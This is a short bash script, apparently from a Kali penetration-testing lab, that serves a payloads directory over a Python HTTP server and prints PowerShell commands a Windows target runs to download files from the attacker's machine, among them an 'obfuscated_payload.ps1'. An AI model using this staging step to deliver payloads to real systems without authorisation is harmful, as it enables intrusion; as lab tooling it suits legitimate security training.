#!/bin/bash
# Setup simple HTTP server for file transfer between Kali and Windows

echo "=== File Transfer Setup ==="
echo "[*] Starting Python HTTP server for file transfer..."

# Get Kali IP address
KALI_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)

echo "[+] Kali IP Address: $KALI_IP"
echo ""
echo "Instructions for Windows target:"
echo "1. Open PowerShell on Windows"
echo "2. To download a file, run:"
echo "   Invoke-WebRequest -Uri http://$KALI_IP:8000/filename -OutFile filename"
echo ""
echo "Example - Download obfuscated payload:"
echo "   Invoke-WebRequest -Uri http://$KALI_IP:8000/obfuscated_payload.ps1 -OutFile C:\\Users\\Public\\Desktop\\Payloads\\obfuscated_payload.ps1"
echo ""
echo "[*] Starting server on port 8000..."
echo "[!] Press Ctrl+C to stop the server"

# Start Python HTTP server in payloads directory
cd /home/kali/payloads
python3 -m http.server 8000
